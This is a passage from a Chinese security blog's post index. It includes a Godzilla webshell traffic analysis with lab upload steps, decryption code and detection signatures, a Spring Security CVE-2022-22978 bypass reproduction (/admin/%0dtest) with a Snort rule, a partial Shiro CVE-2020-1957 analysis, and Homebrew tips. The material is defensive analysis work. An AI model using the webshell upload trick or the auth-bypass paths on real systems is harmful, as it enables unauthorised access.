对截取后的响应包内容进行 base64解码 + aes解密 + gzip解压缩 参考文章https://xz.aliyun.com/t/10556","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"流量分析","slug":"Web安全/流量分析","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[],"author":"Gryffinbit"},{"title":"brew update卡住的解决","slug":"brew-update卡住的解决","date":"2022-12-22T10:45:27.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/12/22/brew-update卡住的解决/","permalink":"https://gryffinbit.top/2022/12/22/brew-update%E5%8D%A1%E4%BD%8F%E7%9A%84%E8%A7%A3%E5%86%B3/","excerpt":"","text":"先更新下brew有时brew版本太旧也会有问题 1/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 再更新国内源1234567891011#更新Homebrewcd &quot;$(brew --repo)&quot;git remote set-url origin https://mirrors.ustc.edu.cn/brew.git#更新Homebrew-corecd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot;git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git#更新Homebrew-cask（最重要的一步，很多更新完国内源依然卡就是没更新这个）cd &quot;$(brew --repo)&quot;/Library/Taps/homebrew/homebrew-caskgit remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git 更新HOMEBREW_BOTTLE_DOMAIN最重要 使用zsh的用户 12echo &#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles/&#x27; &gt;&gt; ~/.zshrcsource ~/.zshrc 使用bash的用户 12echo &#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles/&#x27; &gt;&gt; ~/.bash_profilesource ~/.bash_profile 更新库12brew update-reset brew update 如果卡住的话，直接进行升级 1brew upgrade","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"macOS13 通过brew安装不同版本的PHP","slug":"macOS13-通过brew安装不同版本的PHP","date":"2022-12-22T10:37:50.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/12/22/macOS13-通过brew安装不同版本的PHP/","permalink":"https://gryffinbit.top/2022/12/22/macOS13-%E9%80%9A%E8%BF%87brew%E5%AE%89%E8%A3%85%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84PHP/","excerpt":"","text":"安装安装多个 PHP 版本。首先，不要为 PHP 使用默认的自制软件核心 tap。使用shivammathur&#x2F;php。 12brew tap shivammathur/phpbrew install shivammathur/php/php@8.0 然后将PHP8.0设置为默认PHPCLI版本 12brew unlink phpbrew link --overwrite --force php@8.0 https://kevdees.com/install-nginx-multiple-php-versions-on-macos-13-ventura/","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"macOS13","slug":"macOS13","permalink":"https://gryffinbit.top/tags/macOS13/"}],"author":"Gryffinbit"},{"title":"哥斯拉v1.0加密分析及特征流量提取","slug":"哥斯拉V1.0加密分析及特征流量提取","date":"2022-12-19T10:20:47.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/12/19/哥斯拉V1.0加密分析及特征流量提取/","permalink":"https://gryffinbit.top/2022/12/19/%E5%93%A5%E6%96%AF%E6%8B%89V1.0%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90%E5%8F%8A%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F%E6%8F%90%E5%8F%96/","excerpt":"","text":"哥斯拉简介哥斯拉，他是继菜刀、蚁剑、冰蝎之后具有更多优点的Webshell管理工具，由java语言开发，如名称一样，他的“凶猛”之处主要体现在： 全部类型的shell能绕过市面大部分的静态查杀 流量加密能绕过过市面绝大部分的流量Waf Godzilla自带的插件是冰蝎、蚁剑不能比拟的 它能实现的功能除了传统的命令执行、文件管理、数据库管理之外，根据shell类型的不同还包括了：MSF联动、绕过OpenBasedir 加密流量提取思路特征识别互联网通讯协议众多，不同的应用通常会采用不同的协议，而各种协议都有其特殊的指纹，这些指纹可能是特定的端口、特定的字符串或者特定的比特序列。基于特征的识别技术，正是通过识别数据报文中的指纹信息来确定业务所承载的应用以及该应用是否存在异常。 如通过特征指纹识别常见的的黑客工具，如菜刀、蚁剑、冰蝎、Godzilla等webshell工具的通讯；Regeorg、Tunna、Frp、EarthWorm等网络穿透工具的通讯；CobaltStrike、MSF等渗透工具的通讯。 在加密流量检测上可以通过对加密握手过程中产生的JA3指纹，SNI信息，证书颁发者等信息，做特征匹配，精准识别到APT组织中使用的特种木马或基于框架生成的商业木马，发现内网失陷资产。 隐蔽信道隐蔽信道可以分为使用未知协议与利用已知协议两种。 使用未知协议的隐蔽信道检测通过对网络层、应用层协议的匹配分析，对常见端口下的数据传输进行协议位特征的匹配，选择多种特征位进行数据匹配，当所有匹配特征都无法匹配该端口下的通讯数据，则认为通讯不是该端口该运行的协议，即为网络隐蔽信道通信。 对于利用已知协议正常业务字段的进行隐蔽通信部分，可以首先按照协议对流量进行分类解析，然后针对与每种协议进行字段划分，特征提取，统计建模，比如DNS隧道，APT组织经常使用DNS隧道来对木马进行指令下发数据传输等控制，僵尸网络使用DGA上线等。 哥斯拉软件安装及使用安装项目地址：https://github.com/BeichenDream/Godzilla/releases 下载.jar 文件 运行： 1java -jar godzilla.jar 靶场攻击 php搭建的网站和jsp搭建网站：apache 服务器一般使用PHP搭建。tomcat 服务器一般使用jsp搭建。 木马是要在服务器上自动执行，执行脚本，所以木马格式要与服务器的语言保持一致。比如php的网站，要用php的木马。 访问网站index.php，可以看出是php网站，生成php的马 使用upload的靶场 123docker search upload-labsdocker image pull c0ny1/upload-labsdocker run -d -p 80:8080 c0ny1/upload-labs 使用哥斯拉生成一个木马 修改木马后缀 改为.png，上传，同时用burp拦截，改包，改成.php再发送 检查一下，确实已经上传 哥斯拉连接 目标地址：http://ip:8080/upload/test.php 连接成功 反编译获得源码JD-GUI 反编译下载工具 https://jd-gui.apponic.com/mac/ M1 系统报错： 解决方案1： 右键JD-GUI，显示包内容 进入Contents/MacOS文件夹，打开universalJavaApplicationStub.sh文件，使用新版的文件替换，新版文件内容可以在如下地址复制 https://raw.githubusercontent.com/tofi86/universalJavaApplicationStub/master/src/universalJavaApplicationStub 解决方案2： 右键JD-GUI.app 显示包内容，打开info.plist。 修改第149行，把1.8+改成1.8即可。 1&lt;key&gt;JVMVersion&lt;/key&gt; &lt;string&gt;1.8&lt;/string&gt; 双击打开软件，将需要反编译的jar包拖到软件界面中 选中全部文件，点击File-Save All Sources保存反编译完的源码，选择保存路径 整体分析流程概述哥斯拉全套的攻击流程 在客户端生成shell，生成shell的时候可以设置参数，包括：密码、密钥、有效载荷、加密器 有效载荷分为java、php、c#三种类型的payload 加密器分为base64和raw两大类。其中java的加密方式是通过AES加密，在此基础上再进行base64编码（base64），或直接AES加密完的数据（raw）。C#的加密方式是通过AES加密，在此基础上再进行base64编码（base64），或直接AES加密完的原数据（raw）。PHP的加密方式是原始数据和密钥的md5值的前16位按位异或，然后再进行base64的编码（base64）。或直接进行异或（raw） 生成shell.php（文件名可自定义，根据选择的有效载荷不同，可以有jsp、php、aspx等文件格式），该shell.php需要上传到攻击的目标主机上。 这个文件，会出现在数据包的POST请求中。 该文件会将密码、密钥的md5值前16位明文写入。 该文件的实现功能还有：将密码和密钥进行拼接，然后进行md5的计算。一共32位。服务器端返回数据的时候，会进行拼接。即服务器端返回数据 &#x3D; md5前16位+加密数据+md5后16位。（加密数据可以通过对服务器端的解密算法进行解密） 哥斯拉客户端进行连接 URL是目标主机上的shell.php 请求配置的参数，可以添加冗余数据，该冗余数据会在数据的正式内容的前后添加进去。 连接成功后，进入shell便可以进行操作。 数据包分析 在哥斯拉客户端进行连接的时候，会有一步测试连接的过程。一共产生三个数据包： 第一个数据包会将shells/payloads/php/assets/payload.php的内容发送过去。该文件定义了shell所有功能所需的一系列函数，哥斯拉第一次连接shell时，将这些函数定义发送给服务器并存储在session中，后续的shell操作只需要发送函数名称以及对应的函数参数即可。 第二、三数据包内容一样，解密后的内容为methodName=test。该数据包的含义是将payload.php中的函数名传入。它会实现payload.php中test函数的功能 进入shell也会产生和测试连接时相同的数据包。主要都是第一个数据包是发送payload.php的内容。后面的数据包是传入函数名和参数。以methodName=xxxx的形式。（命令执行会是cmdline=xxx&amp;methodName=xxx） 加密过程客户端发送的request： 先对原始数据进行base64的编码 然后和密钥key按位异或（这个密钥key是取shellsetting时自定义设置的那个密钥的md5值前16位。） 将得到的数据再base64一次，再url编码一次。 最后将得到的数据与密码进行拼接。 相对应的加密函数 1234567891011121314151617181920212223242526272829303132public byte[] encode(byte[] data) &#123; /* */ try &#123; /* 53 */ return E(data); /* 54 */ &#125; catch (Exception e) &#123; /* 55 */ Log.error(e); /* 56 */ return null; /* */ &#125; /* */ &#125; public byte[] E(byte[] data) &#123; /* 83 */ byte[] cs = functions.base64Encode(data).getBytes(); /* 84 */ int len = cs.length; /* 85 */ for (int i = 0; i &lt; len; i++) &#123; /* 86 */ cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); /* */ &#125; /* 88 */ return (String.valueOf(this.pass) + &quot;=&quot; + URLEncoder.encode(functions.base64Encode((new String(cs)).getBytes()))).getBytes(); /* */ &#125; 服务器端的respond： 解密过程 先调用findStr函数删除服务器响应数据左右附加的混淆字符串（生成shell时设置的参数，自定义添加的冗余数据） 对于PHP_XOR_BASE64加密方式来说，前后默认各附加了16位的混淆字符：将密码和密钥进行拼接，然后进行md5的计算。一共32位。服务器端返回数据的时候，会进行拼接。即服务器端返回数据 &#x3D; md5前16位+加密数据+md5后16位。（加密数据可以通过对服务器端的解密算法进行解密） 将得到的数据进行url解码然后base64解码 最后再和shell连接密钥md5值的前16位按位异或，将结果最终base64解码即完成响应数据的解密。 相对应的解密函数 1234567891011121314151617181920212223242526272829303132333435363738394041# 先删除data的混淆数据public String findStr(byte[] respResult) &#123; String htmlString = new String(respResult); return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight); &#125;# 按位异或（解密base64） public byte[] D(String data) &#123; byte[] cs = functions.base64Decode(data); int len = cs.length; // 原始数据与密钥md5的前16位按位异或 for (int i = 0; i &lt; len; i++) &#123; cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); &#125; return functions.base64Decode(new String(cs));&#125;# 解密 public byte[] decode(byte[] data) &#123; if (data != null &amp;&amp; data.length &gt; 0) &#123; try &#123; return D(findStr(data)); //先删除data的混淆字符串，再调用D函数进行解密 &#125; catch (Exception e) &#123; Log.error(e); return null; &#125; &#125; return data;&#125; 解密代码 自己简单的写了一个，可以实现功能，但比较粗糙 1234567891011121314151617181920212223242526&lt;?phpfunction encode($D, $K)&#123; for ($i = 0; $i &lt; strlen($D); $i++) &#123; $D[$i] = $D[$i] ^ $K[$i + 1 &amp; 0xF]; &#125; return $D;&#125;$pass = &#x27;pass&#x27;;$payloadName = &#x27;payload&#x27;;$key = &#x27;3c6e0b8a9c15224a8228b9a98ca1531d&#x27;;//客户端发送请求部分的解密$s = base64_decode(encode(base64_decode(urldecode(&quot;&quot;)), $key));//服务器端响应部分的解密（不需要url解码；未删除冗余数据）//$s = base64_decode(encode(base64_decode(&quot;&quot;), $key));for ($i = 0; $i &lt; strlen($s); $i++) &#123; echo $s[$i];&#125; 哥斯拉加密分析加密shell设置 密码：Post请求中的参数名称（默认密码为pass） 密钥：用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的md5值，然后取其前16位用于加密过程 有效载荷 加密器 扰乱数据：用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征。 哥斯拉shell种类哥斯拉提供了三种shell，分别是java、C#、PHP 源代码中，也对应了这三种类型：cshapAes, JavaAes, phpXor 分析客户端的加密代码，找到cryptions，因为用的是php的shell，所以分析php shell的代码 加密方式，采用的是base64的异或加密。shells/cryptions/phpxor/template/base64.bin 这是一个php文件，提取出来进行分析 整个shell的基本执行流程是：服务器接收到哥斯拉发送的第一个请求后，由于此时尚未建立session，所以将POST请求数据解密后（得到的内容为shell操作中所需要用到的相关php函数定义代码）存入session中，后续哥斯拉只会提交相关操作对应的函数名称（如获取目录中的文件列表对应的函数为getFile）和相关参数，这样哥斯拉的相关操作就不需要发送大量的请求数据。 123echo substr(md5($P.$T),0,16);echo Q(E(@run($F),$T));echo substr(md5($P.$T),16); 它将密码和密钥进行拼接，然后进行md5的计算。一共32位。服务器端返回数据的时候，会将这个数据的前16位和后16位中间拼接上base64等加密过的返回数据。 抓包分析-查看“测试连接”操作所发送的数据包设置代理，用burpsuite拦截，查看产生了什么数据包代理端口设置为8888 测试链接后，产生三个数据包 第1个请求会发送大量数据，该请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是会设置PHPSESSID，后续请求都会自动带上该Cookie。 第2、3个请求完全一致，并且数据量很少，会带上PHPSESSID 第一个数据包分析点击测试按钮，会进行操作，根据这一点去查看源代码。 根据ui的布局，找到测试按钮相关UI，再去追溯到功能代码部分 如果updateTempShellEntity()为 true 则执行向下执行，检查initShellOpertion()，检查通过后，执行getPayloadModel().test() 则连接成功。 函数updateTempShellEntity()的作用是：检查shellsetting的那些信息是否填写完全。url， password，secretKey ，payload ，cryption， encoding 函数initShellOpertion() 找到函数initShellOpertion()的位置，是ShellEntity中的 跳到import中，查找Shellentity 去ShellEntity.java找到函数initShellOpertion() tip：函数的执行过程，以注释的方式在代码后面标明 查看cryptionModel 初始化的函数init 在上述init()函数中，首先初始化了上下文对象、Http对象、密钥等信息，然后加载src\\shells\\payloads\\php\\assets\\payload.php文件内容作为payload数据（到目前为止，还未进行任何加密操作）。payload.php文件内容如下所示，其中定义了shell所有功能所需的一系列函数，哥斯拉第一次连接shell时，将这些函数定义发送给服务器并存储在session中，后续的shell操作只需要发送函数名称以及对应的函数参数即可。 最终第一个数据包的发送，是通过shells/cryptions/phpXor/PhpXor.java的init 函数，这段代码实现的👇 最终POST请求数据&#x3D; 左边追加数据+编码后的原始数据+右边追加数据 其中encode函数👇 加密的过程 1234567891011121314151617181920212223242526272829303132public byte[] encode(byte[] data) &#123; /* */ try &#123; /* 53 */ return E(data); /* 54 */ &#125; catch (Exception e) &#123; /* 55 */ Log.error(e); /* 56 */ return null; /* */ &#125; /* */ &#125; public byte[] E(byte[] data) &#123; /* 83 */ byte[] cs = functions.base64Encode(data).getBytes(); /* 84 */ int len = cs.length; /* 85 */ for (int i = 0; i &lt; len; i++) &#123; /* 86 */ cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); /* */ &#125; /* 88 */ return (String.valueOf(this.pass) + &quot;=&quot; + URLEncoder.encode(functions.base64Encode((new String(cs)).getBytes()))).getBytes(); /* */ &#125; 数据的加密过程是：先对原始数据进行base64的编码，然后和密钥key按位异或，这个密钥key是取shellsetting时自定义设置的那个密钥的md5值前16位。 将得到的数据再base64一次，再url编码一次。最后将得到的数据与密码进行拼接。 综上可知，哥斯拉发送的第一个POST请求中，请求数据的加密过程为：将原始数据（即shells/payloads/php/assets/payload.php文件）进行base64编码，然后与shell密钥（生成shell时设置的那个，初始为key）md5值的前16位按位异或，得到编码数据，最终还需要对数据编码进行URL编码，拼接上shell密码（生成shell时设置的那个，作为POST请求参数的那个，初始为pass）。作为POST报文请求体，POST到服务器。 解密过程与加密过程正好相反：从pass=编码数据中提取编码数据，依次经过URL解码然后base64解码，再与shell密钥md5值的前16位按位异或，最后base64解码即可得到原始请求数据。 第二个数据包分析(2和3数据包是一样的) 第二个数据包的产生在this.payloadModel.test() 找到test()函数 是一个布尔型的。测试成功后，会返回true。if函数顺利运行，连接成功。 123if(this.payloadModel.test())&#123; state = true;&#125; trim() 函数移除字符串两侧的空白字符或其他预定义字符。 查看evalFunc 函数，发送了请求 this.payloadModel.test()的执行过程为：调用了evalFunc函数。该函数将数据POST给服务器，并获得服务器的响应。 1byte[] result = evalFunc(null, &quot;test&quot;, parameter); // 获得服务器的响应 将服务器的返回结果格式修改后，与ok对比，判断为ok则连接成功。 1234567String codeString = new String(result); /* 200 */if (codeString.trim().equals(&quot;ok&quot;)) &#123; // 对字符串进行格式修改，使之没有空格。服务器返回ok的话，则连接成功 /* 201 */ return true; /* */ &#125; 说明在evalFunc函数执行过程中，已经得到了明文的服务器返回数据，因此服务器返回报文的解密过程肯定是在evalFunc函数中。 将evalFunc的内容单独提出来 123456789101112131415public byte[] evalFunc(String className, String funcName, ReqParameter praameter) &#123; /* 90 */ if (className != null &amp;&amp; className.trim().length() &gt; 0) &#123; /* 91 */ praameter.add(&quot;codeName&quot;, className); /* */ &#125; /* 93 */ praameter.add(&quot;methodName&quot;, funcName); /* 94 */ byte[] data = praameter.format().getBytes(); /* 95 */ return this.http.sendHttpResponse(data).getResult(); //POST到服务器，并获取服务器响应 /* */ &#125; 定位到public HttpResponse sendHttpResponse函数，探究sendHttpResponse的执行过程。找到HttpResponse文件（util/http/HttpResponse.java）查看是否有解密过程。（即这一行运行的时候，应该是明文的“OK”，现在需要探究是从哪里开始变成解密后的明文ok） 1this.result = this.shellEntity.getCryptionModel().decode(this.result); //解密响应数据 找到decode函数(shells&#x2F;cryptions&#x2F;phpXor&#x2F;PhpXor.java) 解密函数D 12345678910111213141516public byte[] D(String data) &#123; /* 91 */ byte[] cs = functions.base64Decode(data); /* 92 */ int len = cs.length; /* 93 */ // 原始数据与密钥md5的前16位按位异或 for (int i = 0; i &lt; len; i++) &#123; /* 94 */ cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); /* */ &#125; /* 96 */ return functions.base64Decode(new String(cs)); /* */&#125; 删除混淆字符函数findStr（左右追加的部分，这个例子里没有追加） 1234567public String findStr(byte[] respResult) &#123; /* 99 */ String htmlString = new String(respResult); /* 100 */ return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight); /* */&#125; 由上述代码可知，服务器响应数据解密过程并不复杂，先调用findStr函数删除服务器响应数据左右附加的混淆字符串（对于PHP_XOR_BASE64加密方式来说，前后各附加了16位的混淆字符），然后将得到的数据进行url解码然后base64解码，最后再和shell连接密钥md5值的前16位按位异或，将结果最终base64解码即完成响应数据的解密。至此，我们已经明白了哥斯拉的PHP_XOR_BASE64加密shell，在测试连接过程中产生POST请求和响应数据的加密和解密过程。哥斯拉的其他shell功能，除了产生的POST请求内容不同外，数据的加解密过程都是一样的。 解密部分涉及到的函数（可以运行的解密代码，在概述里附上了） 1234567891011121314151617181920212223242526272829303132333435363738394041# 先删除data的混淆数据public String findStr(byte[] respResult) &#123; String htmlString = new String(respResult); return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight); &#125;# 按位异或（解密base64）public byte[] D(String data) &#123; byte[] cs = functions.base64Decode(data); int len = cs.length; // 原始数据与密钥md5的前16位按位异或 for (int i = 0; i &lt; len; i++) &#123; cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); &#125; return functions.base64Decode(new String(cs));&#125;# 解密public byte[] decode(byte[] data) &#123; if (data != null &amp;&amp; data.length &gt; 0) &#123; try &#123; return D(findStr(data)); //先删除data的混淆字符串，再调用D函数进行解密 &#125; catch (Exception e) &#123; Log.error(e); return null; &#125; &#125; return data;&#125; 第一个数据包请求内容是payload.php 第二、三个数据包请求2、3数据包请求一样 抓包分析-进入shell的数据包进入shell后，会产生三个数据包 第一个数据包解码后发现，数据包内容是payload.php 的内容，也就是payload功能函数。之所以在第一个数据包将payload.php内容传入，目的是后续的shell操作请求功能的时候，只需要发送函数名称以及对应的函数参数即可。不需要再请求一大长串数据包。 第二个数据包解码后发现，数据包内容是methodName=test，他产生于this.payloadModel.test()的eval函数中 1234567891011121314151617181920212223242526272829// this.payloadModel.test()的test()函数功能byte[] result = evalFunc(null, &quot;test&quot;, parameter); // 获得服务器的响应String codeString = new String(result); if (codeString.trim().equals(&quot;ok&quot;)) &#123; // 对字符串进行格式修改，使之没有空格。服务器返回ok的话，则连接成功 return true; &#125;// eval 函数 public byte[] evalFunc(String className, String funcName, ReqParameter praameter) &#123; if (className != null &amp;&amp; className.trim().length() &gt; 0) &#123; praameter.add(&quot;codeName&quot;, className); &#125; praameter.add(&quot;methodName&quot;, funcName); byte[] data = praameter.format().getBytes(); return this.http.sendHttpResponse(data).getResult(); //POST到服务器，并获取服务器响应 &#125; 可以到payload.php中，去查找test函数的内容 123function test()&#123; return &quot;ok&quot;;&#125; 根据上面的函数可以分析得到：test函数调用了eval函数，eval函数将传进的funcName对应的就是payload.php中的功能函数。eval将去执行payload.php里面的test函数。得到的结果是返回了OK。eval函数再将这个结果存入byte[] result。this.payloadModel.test()的test()函数会对比结果，如果和ok值一样，则代表连接成功。 第三个数据包解码后发现，数据包内容是methodName=getBasicsInfo 和第二个数据包分析思路一致，这里的getBasicsInfo也是payload.php中的函数。它的作用是，显示攻击目标的基础信息。包括php信息、用户、编码等一系列信息。 服务器端返回结果解密： 去掉前16位和后16位的冗余数据，将中间的base64部分解密（不需要再进行一步url解码了），可以得到详细的信息👇 抓包分析-其他操作数据包执行命令 进入shell之后执行命令 ls 抓包：👇（产生一个数据包） 解码（有一些request的数据包base64有一些小错误，输出结果只需要再把个别部分base64解码一下就可以了。） request解码内容为：cmdLine=ls&amp;methodName=execCommand 服务器响应结果为ls执行后显示的内容👇 规则提取思路 默认的密码为pass，密钥为key，可以将默认的密码作为规则进行筛选。 payload.php文件内容如下所示，其中定义了shell所有功能所需的一系列函数，哥斯拉第一次连接shell时，将这些函数定义发送给服务器并存储在session中，后续的shell操作只需要发送函数名称以及对应的函数参数即可。 数据包请求会有该流量特征：pass=methodName=‘函数名’ 123456789101112131415161718192021runbypass_open_basedirformatParameterevalFuncdeleteDirdeleteFilecopyFilemoveFilegetBasicsInfogetFilereadFileContentuploadFilenewDirnewFileexecCommandexecSqlbase64EncodetestgetincludeCodebase64Decode 默认密钥key带来的第一个请求包，包含特征AQQWDQ== 参考文章https://www.colasoft.com.cn/news/20220523.php https://www.freebuf.com/sectool/285693.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"流量分析","slug":"Web安全/流量分析","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Godzilla","slug":"Godzilla","permalink":"https://gryffinbit.top/tags/Godzilla/"}],"author":"Gryffinbit"},{"title":"Spring-security 认证绕过漏洞复现及流量分析（CVE-2022-22978）","slug":"Spring-security-认证绕过漏洞复现及流量分析（CVE-2022-22978）","date":"2022-12-12T10:46:44.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/12/12/Spring-security-认证绕过漏洞复现及流量分析（CVE-2022-22978）/","permalink":"https://gryffinbit.top/2022/12/12/Spring-security-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-22978%EF%BC%89/","excerpt":"","text":"漏洞详情漏洞描述当Spring-security使用 RegexRequestMatcher 进行权限配置，由于RegexRequestMatcher正则表达式配置权限的特性，正则表达式中包含“.”时，未经身份验证攻击者可以通过构造恶意数据包绕过身份认证。 影响版本： Spring Security 5.5.x &lt; 5.5.7 Spring Security 5.6.x &lt; 5.6.4 漏洞原理在访问&#x2F;admin&#x2F;{name}接口时，需要认证才能访问。当认证接口使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，如分号；就可能产生限制绕过。而在spring-security中，存在StrictHttpfirewall机制默认对特殊字符进行过滤，所以使用&#x2F;admin&#x2F;..;&#x2F;1这种方式也就无法绕过。 但是在正则表达式中元字符“.”是匹配除换行符（\\n、\\r）之外的任何单个字符，在java中的正则默认情况下“.”也同样不会包含\\n、\\r字符，所以RegexRequestMatcher在进行正则匹配时不会处理\\n、\\r 在spring-security中利用换行符可实现权限认证进行绕过，\\r的URl编码为%0d，\\n的URL编码为%0a 漏洞复现靶场12docker pull s0cke3t/cve-2022-22978:latestdocker run -d -p 8080:8080 s0cke3t/cve-2022-22978:latest 访问&#x2F;admin&#x2F;xxx会跳转至登陆页面进行权限验证。 漏洞产生的原因是由于正则发生了问题，可以通过在 URL 中加入换行符（ r 或 n ）来绕过。（\\r的url编码为%0d，\\n的url编码为%0a） 使用/admin/%0dtest 或者 /admin/%0atest成功绕过登陆认证。 流量分析/admin/%0d 或者 /admin/%0a 是特征流量。 规则编写时，选择参数nocase 使用 nocase 关键字，规则编写者可以指定 Snort 应该查找特定的模式，而忽略大小写。nocase 修改规则中的上一个 content 关键字。 例子 1alert tcp any any -&gt; any 21 (msg:&quot;FTP ROOT&quot;; content:&quot;USER root&quot;; nocase;)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://gryffinbit.top/tags/Spring/"}],"author":"Gryffinbit"},{"title":"Shiro认证绕过漏洞复现（CVE-2020-1957）","slug":"Shiro认证绕过漏洞复现（CVE-2020-1957）","date":"2022-12-05T10:43:31.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/12/05/Shiro认证绕过漏洞复现（CVE-2020-1957）/","permalink":"https://gryffinbit.top/2022/12/05/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-1957%EF%BC%89/","excerpt":"","text":"漏洞详情Shiro组件Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。内置了可以连接大量安全数据源（又名目录）的Realm，如LDAP、关系数据库（JDBC）、类似INI的文本配置资源以及属性文件等。 漏洞描述Apache Shiro 1.5.2之前的版本，由于Shiro拦截器和requestURI的匹配流程与Web框架的拦截器的匹配流程有差异，攻击者构造一个特殊的http请求，可以绕过Shiro的认证，未授权访问敏感路径。 此漏洞有两种攻击方式： 第一种攻击方式适用于Shiro &lt; 1.5.0版本。 由于Shiro 1.5.0版本修复补丁考虑不全面，导致补丁绕过，出现了第二种攻击方式，适用于Shiro &lt; 1.5.2版本。 漏洞分析Shiro 1.4.2 -&gt; 1.5.0 版本补丁分析对比Shiro 1.4.2与Shiro 1.5.0版本的改动，Shiro在org.apache.shiro.web.filter.PathMatchingFilter类中添加了删除requestURI结尾的/的代码。 Shiro 1.4.2 代码分析传入的payload首先被服务器接收，并传送给Shiro拦截器处理(org.apache.shiro.web.servlet.OncePerRequestFilter#doFilter方法作为入口)。 调用createSubject方法创建Subject，并调用execute方法进入Shiro FilterChain中。 进入org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver# getChain方法中，首先获取请求URI路径，之后迭代获取拦截器的表达式。 这里重点关注&#x2F;hello&#x2F;*表达式。代码进入pathMatches方法，最终调用org.apache.shiro.util.AntPathMatcher#doMatch方法进行传入的requestURI与拦截器表达式进行匹配。 匹配过程中，分别将拦截器表达式与requestURI以&#x2F;作为分隔符进行字符串到数组的转换，通过循环匹配数组中对应的元素，判断requestURI是否符合拦截器表达式匹配形式。 如果表达式中存在通配符*，会将containsStar标志位赋值为true，进入 else if (patIdxEnd &#x3D;&#x3D; 0)判断条件，返回true。 继续跟进代码，在requestURI与拦截器表达式匹配结束后，还会进行一次判断，而漏洞产生的原因也是由于判断的条件。如果Shiro拦截器表达式不以&#x2F;结尾，且requestURI以&#x2F;结尾，判断代码将返回false表示匹配失败，从而绕过Shiro认证 跟进到Spring处理URI的代码，进入org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal方法，获取requestURI。 进入lookupHandlerMethod方法，调用addMatchingMappings方法，获取Spring拦截器。 进入org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingCondition方法进行调用doMatch方法进行requestURI和拦截器表达式的匹配。 Spring拦截器匹配流程和Shiro大致相同，都是将字符串转换为数组进行匹配。 由于Spring多了一个环节，在检测拦截器表达式与requestURI结尾是否为&#x2F;之后，并没有直接返回false。而是将拦截器表达式结尾添加&#x2F;，并继续进行 path.startsWith(this.pathSeparator) !&#x3D; pattern.startsWith(this.pathSeparator) 测试，从而完成了拦截器表达式与requestURI的匹配。 Shiro 1.5.1 -&gt; 1.5.2 版本补丁分析对比Shiro 1.5.1与Shiro 1.5.2版本的改动 Shiro 1.5.2版本中，在进行decodeAndCleanUriString方法之前会先进行URI解析，调用request.getServletPath()和request.getPathInfo()获取ServletPath和PathInfo并进行路径拼接。 *Shiro 1.5.1代码分析* Shiro 1.5.0 - 1.5.1在认证过程中基本没有变化，主要分析一下二次绕过的利用点。还是以org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain作为起点。 在获取requestURI时,依旧会在getPathWithinApplication方法中调用getRequestUri方法进行requestURI的解析并获取，但是在URI正规化处理时，先调用decodeAndCleanUriString方法进行路径的解码，并清理URI。 